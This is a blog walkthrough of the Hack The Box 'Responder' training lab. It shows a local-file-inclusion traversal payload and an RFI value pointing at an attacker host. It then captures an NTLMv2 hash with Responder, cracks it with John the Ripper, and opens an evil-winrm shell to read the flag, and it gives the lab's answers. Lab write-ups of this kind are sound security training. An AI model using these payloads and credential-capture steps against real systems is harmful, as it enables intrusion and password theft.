---
layout: post
title:  "Responder"
date:   2022-08-04 00:07:53 +0200
categories: HTB
author: C-Raindrop
description: Starting Point From HTB - Responder
---

Path: Starting Point
Module: You need to walk before you can run
Section: Responder
Tier: 1

# PWN Process

- Recon

```c
┌──(kali㉿kali)-[~]
└─$ t=10.129.232.104
```
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -sV $t
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 03:37 EDT
Nmap scan report for 10.129.232.104
Host is up (0.052s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.87 seconds
```

-> Windows OS running apache web server

-> Visiting the ip in the browser we are getting redirected to unika.htb, but the dns is not able to resolve the name, so we have to add it to the /etc/hosts file:
```c
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
```
-> The following lines are desirable for IPv6 capable hosts
```
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.232.104 unika.htb
```
-> Once done, the name is resolved correctly and we can access the website

-> We find a section of the page that loads another page, based on the language we select. The URL looks like this:

[http://unika.htb/index.php?page=french.html](http://unika.htb/index.php?page=french.html)

-> Because it is loading/including an existing file on the server with the name we are sending through the URL it is possible that if it is not properly sanitized/programmed there could be a Local File Inclusion vulnerability.

-> To check it we can try to access an existing file of the server, wich by now we know that is running Windows as OS.

-> Knowing that we can try to access the hosts file in the server sending the path through the url, which should look something like this:

	http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

-> The response we get is the contents of the hosts file in the server:
```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
```

-> Knowing that it is vulnerable we can get the credentials

```kali
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
											__
	.----.-----.-----.-----.-----.-----.--|  |.-----.----.
	|   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	|__| |_____|_____|   __|_____|__|__|_____||_____|__|
					|__|

			NBT-NS, LLMNR & MDNS Responder 3.1.1.0

	Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	To kill this script hit CTRL-C


[+] Poisoners:
	LLMNR                      [ON]
	NBT-NS                     [ON]
	MDNS                       [ON]
	DNS                        [ON]
	DHCP                       [OFF]

[+] Servers:
	HTTP server                [ON]
	HTTPS server               [ON]
	WPAD proxy                 [OFF]
	Auth proxy                 [OFF]
	SMB server                 [ON]
	Kerberos server            [ON]
	SQL server                 [ON]
	FTP server                 [ON]
	IMAP server                [ON]
	POP3 server                [ON]
	SMTP server                [ON]
	DNS server                 [ON]
	LDAP server                [ON]
	RDP server                 [ON]
	DCE-RPC server             [ON]
	WinRM server               [ON]

[+] HTTP Options:
	Always serving EXE         [OFF]
	Serving EXE                [OFF]
	Serving HTML               [OFF]
	Upstream Proxy             [OFF]

[+] Poisoning Options:
	Analyze Mode               [OFF]
	Force WPAD auth            [OFF]
	Force Basic Auth           [OFF]
	Force LM downgrade         [OFF]
	Force ESS downgrade        [OFF]

[+] Generic Options:
	Responder NIC              [tun0]
	Responder IP               [10.10.14.209]
	Responder IPv6             [dead:beef:2::10cf]
	Challenge set              [random]
	Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
	Responder Machine Name     [WIN-HETWROX5QRP]
	Responder Domain Name      [BG8W.LOCAL]
	Responder DCE-RPC Port     [47724]

[+] Listening for events...                                                                                        

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.232.104
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:06a9770413bd47c8:312A02C10DA599EFE729C13875F257E4:010100000000000080A86B3E00A3D801F6B3A9D2EB40FF4C0000000002000800420047003800570001001E00570049004E002D00480045005400570052004F005800350051005200500004003400570049004E002D00480045005400570052004F00580035005100520050002E0042004700380057002E004C004F00430041004C000300140042004700380057002E004C004F00430041004C000500140042004700380057002E004C004F00430041004C000700080080A86B3E00A3D80106000400020000000800300030000000000000000100000000200000A5813DAE0A3AE8E6560D5E77B2B16CF5B17A1EA16462336335577FFBFA5303770A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300039000000000000000000
```

```kali
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "Administrator::RESPONDER:06a9770413bd47c8:312A02C10DA599EFE729C13875F257E4:010100000000000080A86B3E00A3D801F6B3A9D2EB40FF4C0000000002000800420047003800570001001E00570049004E002D00480045005400570052004F005800350051005200500004003400570049004E002D00480045005400570052004F00580035005100520050002E0042004700380057002E004C004F00430041004C000300140042004700380057002E004C004F00430041004C000500140042004700380057002E004C004F00430041004C000700080080A86B3E00A3D80106000400020000000800300030000000000000000100000000200000A5813DAE0A3AE8E6560D5E77B2B16CF5B17A1EA16462336335577FFBFA5303770A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300039000000000000000000" > hash.txt
```

- Cracking hash with john the ripper

```c
┌──(kali㉿kali)-[~/Desktop]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-07-29 06:16) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

- Connecting to winRM with the docker image

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo docker images
REPOSITORY                 TAG       IMAGE ID       CREATED       SIZE
oscarakaelvis/evil-winrm   latest    d7e66d6cefa9   7 weeks ago   917MB
																													
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo docker run -i -t oscarakaelvis/evil-winrm:latest -i 10.129.205.18 -u Administrator -p 'badminton'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


	Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/11/2020   7:19 AM                3D Objects
d-r---        10/11/2020   7:19 AM                Contacts
d-r---          3/9/2022   5:34 PM                Desktop
d-r---         3/10/2022   4:51 AM                Documents
d-r---        10/11/2020   7:19 AM                Downloads
d-r---        10/11/2020   7:19 AM                Favorites
d-r---        10/11/2020   7:19 AM                Links
d-r---        10/11/2020   7:19 AM                Music
d-r---         4/27/2020   6:01 AM                OneDrive
d-r---        10/11/2020   7:19 AM                Pictures
d-r---        10/11/2020   7:19 AM                Saved Games
d-r---        10/11/2020   7:19 AM                Searches
d-r---        10/11/2020   7:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd "C:/Users/Administrator/Desktop/"
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Downloads
*Evil-WinRM* PS C:\Users\Administrator\Downloads> dir
*Evil-WinRM* PS C:\Users\Administrator\Downloads> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir


	Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls


	Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd "C:/Users/mike/Desktop/"
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


	Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac

#################### Questions ####################

- How many TCP ports are open on the machine?

2

- When visiting the web service using the IP address, what is the domain that we are being redirected to?

unika.htb

- Which scripting language is being used on the server to generate webpages?

php

- What is the name of the URL parameter which is used to load different language versions of the webpage?

page

- Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

../../../../../../../../windows/system32/drivers/etc/hosts

- Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

//10.10.14.6/somefile

- What does NTLM stand for?


New Technology Lan Manager

- Which flag do we use in the Responder utility to specify the network interface?

-I

- There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

John The Ripper

- What is the password for the administrator user?

badminton

- We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

5985

################## FLAG ##################
#										 #
#    ea81b7afddd03efaa0945333ed147fac    #
#										 #
##########################################
